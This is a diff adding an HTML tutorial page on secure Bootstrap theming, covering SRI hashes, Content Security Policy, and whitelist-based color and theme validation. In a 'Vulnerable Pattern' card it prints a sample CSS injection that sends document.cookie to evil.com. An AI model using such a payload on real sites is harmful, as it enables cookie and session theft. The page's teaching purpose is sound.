@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ============================================
+         04_03_13 - Theme Security
+         ============================================
+         Secure theme patterns:
+         - CSP (Content Security Policy) compliance
+         - Preventing CSS injection attacks
+         - Safe external resource loading
+         - Input sanitization for dynamic themes
+         - Subresource integrity (SRI)
+         ============================================ -->
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Subresource Integrity (SRI) hash ensures the CDN
+         file hasn't been tampered with. Generate with:
+         https://www.srihash.org/ -->
+    <link rel="stylesheet"
+          href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+          integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YcnS/1p9l3+n8fJ1p5np3eP1cIRmTRVeL0e"
+          crossorigin="anonymous">
+
+    <!-- CSP meta tag (in production, use HTTP header instead) -->
+    <meta http-equiv="Content-Security-Policy"
+          content="default-src 'self';
+                   style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
+                   script-src 'self' https://cdn.jsdelivr.net;
+                   img-src 'self' data: https:;
+                   font-src 'self' https://fonts.gstatic.com;">
+
+    <title>Secure Theme Patterns</title>
+
+    <style>
+        /* ============================================
+           SECTION 1: CSS-ONLY THEME (NO INLINE STYLES)
+           ============================================
+           Avoid inline styles (style="...") which can
+           be vectors for CSS injection. Use classes
+           and CSS custom properties instead.
+           ============================================ */
+
+        :root {
+            --sec-primary: #1e40af;
+            --sec-secondary: #475569;
+            --sec-success: #059669;
+            --sec-bg: #ffffff;
+            --sec-text: #1a1a1a;
+        }
+
+        /* ============================================
+           SECTION 2: SAFE COLOR APPLICATION
+           ============================================
+           Never use user input directly in CSS values.
+           Use predefined classes and validate inputs.
+           ============================================ */
+
+        .theme-color-primary { background: var(--sec-primary); color: white; }
+        .theme-color-secondary { background: var(--sec-secondary); color: white; }
+        .theme-color-success { background: var(--sec-success); color: white; }
+
+        /* ============================================
+           SECTION 3: PREVENT CSS INJECTION
+           ============================================
+           User-supplied CSS values must be validated.
+           ============================================ */
+
+        .code-block {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            font-family: monospace;
+            font-size: 0.875rem;
+            overflow-x: auto;
+            line-height: 1.6;
+        }
+
+        .code-block .good { color: #4ec9b0; }
+        .code-block .bad { color: #f44747; }
+        .code-block .comment { color: #6a9955; }
+
+        /* Security checklist */
+        .security-check {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+            padding: 0.75rem;
+            border-radius: 0.375rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .security-check.pass { background: #d1fae5; }
+        .security-check.fail { background: #fee2e2; }
+        .security-check.warn { background: #fef3c7; }
+
+        .security-icon {
+            font-size: 1.25rem;
+            flex-shrink: 0;
+        }
+
+        /* Allowed theme presets */
+        .theme-preset {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 3px solid #dee2e6;
+            cursor: pointer;
+            transition: border-color 0.2s, transform 0.2s;
+        }
+
+        .theme-preset:hover {
+            transform: scale(1.1);
+        }
+
+        .theme-preset.active {
+            border-color: var(--sec-primary);
+        }
+
+        /* ============================================
+           SECTION 4: INPUT VALIDATION STYLING
+           ============================================ */
+
+        .input-valid {
+            border-color: var(--sec-success) !important;
+        }
+
+        .input-invalid {
+            border-color: #dc3545 !important;
+        }
+
+        .validation-message {
+            font-size: 0.875rem;
+            margin-top: 0.25rem;
+        }
+
+        .validation-message.valid { color: var(--sec-success); }
+        .validation-message.invalid { color: #dc3545; }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand fw-bold" href="#">Theme Security</a>
+        </div>
+    </nav>
+
+    <!-- Hero -->
+    <section class="py-5 text-center bg-light">
+        <div class="container">
+            <h1 class="display-4 fw-bold mb-3">Secure Theme Patterns</h1>
+            <p class="lead text-muted">
+                CSP compliance, SRI hashes, input validation, and CSS injection prevention.
+            </p>
+        </div>
+    </section>
+
+    <!-- SRI explanation -->
+    <section class="py-5">
+        <div class="container">
+            <h2 class="mb-4">Subresource Integrity (SRI)</h2>
+            <p class="text-muted mb-4">
+                SRI hashes verify that CDN resources haven't been modified by a third party.
+            </p>
+            <div class="code-block">
+<span class="good">&lt;!-- CORRECT: With SRI hash --&gt;</span>
+&lt;link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+      <span class="good">integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YcnS/1p9l3+n8fJ1p5np3eP1cIRmTRVeL0e"</span>
+      <span class="good">crossorigin="anonymous"</span>&gt;
+
+<span class="bad">&lt;!-- DANGEROUS: Without SRI --&gt;</span>
+&lt;link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"&gt;
+<span class="comment">// If CDN is compromised, malicious CSS could be injected</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- CSP explanation -->
+    <section class="py-5 bg-light">
+        <div class="container">
+            <h2 class="mb-4">Content Security Policy</h2>
+            <p class="text-muted mb-4">
+                CSP headers restrict where styles, scripts, and other resources can be loaded from.
+            </p>
+            <div class="code-block">
+<span class="comment">// Recommended CSP header for themed Bootstrap site</span>
+Content-Security-Policy:
+  default-src 'self';
+  <span class="good">style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;</span>
+  script-src 'self' https://cdn.jsdelivr.net;
+  img-src 'self' data: https:;
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+            </div>
+            <div class="alert alert-warning mt-3">
+                <strong>Note:</strong> Bootstrap's inline styles (from JS components) require
+                <code>'unsafe-inline'</code> in <code>style-src</code>. In production, consider
+                using a nonce or hash instead.
+            </div>
+        </div>
+    </section>
+
+    <!-- CSS injection prevention -->
+    <section class="py-5">
+        <div class="container">
+            <h2 class="mb-4">CSS Injection Prevention</h2>
+
+            <div class="row g-4 mb-4">
+                <div class="col-md-6">
+                    <div class="card border-danger">
+                        <div class="card-header bg-danger text-white">
+                            <strong>&#10005; Vulnerable Pattern</strong>
+                        </div>
+                        <div class="card-body">
+                            <pre class="bg-light p-3 rounded small mb-0"><code>// DANGEROUS: User input in CSS
+const color = userInput; // "red; url(evil.com)"
+element.style.color = color;
+
+// CSS injection possible:
+// background: url('https://evil.com/steal?data='
+//   + document.cookie)</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="card border-success">
+                        <div class="card-header bg-success text-white">
+                            <strong>&#10003; Safe Pattern</strong>
+                        </div>
+                        <div class="card-body">
+                            <pre class="bg-light p-3 rounded small mb-0"><code>// SAFE: Whitelist + CSS variable
+const ALLOWED_COLORS = {
+  red: '#dc2626',
+  blue: '#2563eb',
+  green: '#059669',
+};
+
+const safe = ALLOWED_COLORS[userInput];
+if (safe) {
+  document.documentElement
+    .style.setProperty(
+      '--user-color', safe
+    );
+}</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <h5 class="mb-3">Safe Theme Selector (Whitelist Approach)</h5>
+            <p class="text-muted mb-3">
+                Only allow predefined theme presets. Never accept raw CSS from users.
+            </p>
+            <div class="d-flex gap-3 mb-4">
+                <button class="theme-preset active" style="background:#1e40af" data-theme="blue"
+                        aria-label="Blue theme"></button>
+                <button class="theme-preset" style="background:#059669" data-theme="green"
+                        aria-label="Green theme"></button>
+                <button class="theme-preset" style="background:#dc2626" data-theme="red"
+                        aria-label="Red theme"></button>
+                <button class="theme-preset" style="background:#7c3aed" data-theme="purple"
+                        aria-label="Purple theme"></button>
+                <button class="theme-preset" style="background:#1a1a1a" data-theme="dark"
+                        aria-label="Dark theme"></button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Input validation for custom themes -->
+    <section class="py-5 bg-light">
+        <div class="container">
+            <h2 class="mb-4">Input Validation for Custom Themes</h2>
+            <div class="row justify-content-center">
+                <div class="col-md-6">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5>Custom Color Picker</h5>
+                            <p class="small text-muted">
+                                Validate all color inputs against a whitelist pattern.
+                            </p>
+                            <div class="mb-3">
+                                <label class="form-label">Primary Color (hex only)</label>
+                                <input type="text" class="form-control" id="colorInput"
+                                       placeholder="#4f46e5" maxlength="7">
+                                <div class="validation-message" id="colorValidation"></div>
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label">Preview</label>
+                                <div class="p-3 rounded" id="colorPreview"
+                                     style="background:#e9ecef; min-height:60px">
+                                    Enter a valid hex color above
+                                </div>
+                            </div>
+                            <button class="btn btn-primary w-100" id="applyColor">Apply Color</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Security checklist -->
+    <section class="py-5">
+        <div class="container">
+            <h2 class="mb-4">Theme Security Checklist</h2>
+            <div class="row g-4">
+                <div class="col-md-6">
+                    <div class="security-check pass">
+                        <span class="security-icon">&#10003;</span>
+                        <div>
+                            <strong>SRI hashes on CDN links</strong>
+                            <p class="small text-muted mb-0">Verify integrity of external resources</p>
+                        </div>
+                    </div>
+                    <div class="security-check pass">
+                        <span class="security-icon">&#10003;</span>
+                        <div>
+                            <strong>CSP headers configured</strong>
+                            <p class="small text-muted mb-0">Restrict style and script sources</p>
+                        </div>
+                    </div>
+                    <div class="security-check pass">
+                        <span class="security-icon">&#10003;</span>
+                        <div>
+                            <strong>No user CSS injection</strong>
+                            <p class="small text-muted mb-0">User input never used as CSS values</p>
+                        </div>
+                    </div>
+                    <div class="security-check pass">
+                        <span class="security-icon">&#10003;</span>
+                        <div>
+                            <strong>Whitelist theme presets</strong>
+                            <p class="small text-muted mb-0">Only predefined themes allowed</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="security-check pass">
+                        <span class="security-icon">&#10003;</span>
+                        <div>
+                            <strong>HTTPS only resources</strong>
+                            <p class="small text-muted mb-0">All external resources loaded via HTTPS</p>
+                        </div>
+                    </div>
+                    <div class="security-check pass">
+                        <span class="security-icon">&#10003;</span>
+                        <div>
+                            <strong>crossorigin="anonymous"</strong>
+                            <p class="small text-muted mb-0">No credentials sent to CDN</p>
+                        </div>
+                    </div>
+                    <div class="security-check pass">
+                        <span class="security-icon">&#10003;</span>
+                        <div>
+                            <strong>No eval() in theme code</strong>
+                            <p class="small text-muted mb-0">Theme switching uses data attributes only</p>
+                        </div>
+                    </div>
+                    <div class="security-check warn">
+                        <span class="security-icon">&#9888;</span>
+                        <div>
+                            <strong>Review 'unsafe-inline'</strong>
+                            <p class="small text-muted mb-0">Use nonces/hashes instead if possible</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Safe theme switching code -->
+    <section class="py-5 bg-light">
+        <div class="container">
+            <h2 class="mb-4">Safe Theme Switching Implementation</h2>
+            <div class="code-block">
+<span class="comment">// SAFELY switch themes using data attributes</span>
+<span class="comment">// Never use innerHTML or eval() for theme switching</span>
+
+<span class="good">const ALLOWED_THEMES = ['light', 'dark', 'blue', 'green'];</span>
+
+function switchTheme(themeName) {
+  <span class="good">// Validate against whitelist</span>
+  <span class="good">if (!ALLOWED_THEMES.includes(themeName)) {</span>
+    <span class="bad">// Reject unknown themes</span>
+    <span class="good">console.warn('Invalid theme:', themeName);</span>
+    <span class="good">return;</span>
+  <span class="good">}</span>
+
+  <span class="good">// Use data attribute - safe from injection</span>
+  <span class="good">document.documentElement.setAttribute('data-bs-theme', themeName);</span>
+
+  <span class="good">// Store validated value</span>
+  <span class="good">localStorage.setItem('theme', themeName);</span>
+}
+
+<span class="comment">// Load saved theme with validation</span>
+const saved = localStorage.getItem('theme');
+<span class="good">if (ALLOWED_THEMES.includes(saved)) {</span>
+  switchTheme(saved);
+<span class="good">}</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Allowed theme preview -->
+    <section class="py-5">
+        <div class="container">
+            <h2 class="mb-4">Predefined Theme Presets</h2>
+            <p class="text-muted mb-4">
+                Only these themes can be applied. User customization is limited
+                to selecting from presets, not injecting arbitrary CSS.
+            </p>
+            <div class="row g-4">
+                <div class="col-md-4 col-6">
+                    <div class="card">
+                        <div class="card-body text-center">
+                            <div class="theme-color-primary rounded p-3 mb-2">Blue</div>
+                            <code>#1e40af</code>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4 col-6">
+                    <div class="card">
+                        <div class="card-body text-center">
+                            <div class="theme-color-success rounded p-3 mb-2">Green</div>
+                            <code>#059669</code>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4 col-6">
+                    <div class="card">
+                        <div class="card-body text-center">
+                            <div class="theme-color-secondary rounded p-3 mb-2">Gray</div>
+                            <code>#475569</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="bg-dark text-white py-4">
+        <div class="container text-center">
+            <p class="mb-0">Secure Theme Patterns Demo</p>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        /* ============================================
+           SECURE THEME COLOR INPUT VALIDATION
+           ============================================ */
+
+        const colorInput = document.getElementById('colorInput');
+        const colorValidation = document.getElementById('colorValidation');
+        const colorPreview = document.getElementById('colorPreview');
+        const applyBtn = document.getElementById('applyColor');
+
+        // Strict hex color regex - only allows #RRGGBB format
+        const HEX_PATTERN = /^#[0-9a-fA-F]{6}$/;
+
+        colorInput.addEventListener('input', function() {
+            const value = this.value.trim();
+
+            if (value === '') {
+                colorValidation.textContent = '';
+                colorValidation.className = 'validation-message';
+                return;
+            }
+
+            if (HEX_PATTERN.test(value)) {
+                colorValidation.textContent = '\u2713 Valid hex color';
+                colorValidation.className = 'validation-message valid';
+                colorPreview.style.background = value;
+                colorPreview.textContent = 'Preview: ' + value;
+            } else {
+                colorValidation.textContent = '\u2717 Must be #RRGGBB format (e.g., #4f46e5)';
+                colorValidation.className = 'validation-message invalid';
+                colorPreview.style.background = '#e9ecef';
+                colorPreview.textContent = 'Invalid color';
+            }
+        });
+
+        applyBtn.addEventListener('click', function() {
+            const value = colorInput.value.trim();
+
+            // Double validation before applying
+            if (HEX_PATTERN.test(value)) {
+                document.documentElement.style.setProperty('--sec-primary', value);
+                colorPreview.textContent = 'Applied: ' + value;
+            } else {
+                alert('Invalid color format. Use #RRGGBB (e.g., #4f46e5)');
+            }
+        });
+
+        // Theme preset switching
+        const ALLOWED_THEMES = {
+            blue: '#1e40af',
+            green: '#059669',
+            red: '#dc2626',
+            purple: '#7c3aed',
+            dark: '#1a1a1a'
+        };
+
+        document.querySelectorAll('.theme-preset').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const theme = this.dataset.theme;
+
+                // Validate against whitelist
+                if (!ALLOWED_THEMES[theme]) return;
+
+                // Apply
+                document.documentElement.style.setProperty('--sec-primary', ALLOWED_THEMES[theme]);
+
+                // Update UI
+                document.querySelectorAll('.theme-preset').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+    </script>
+</body>
+</html>
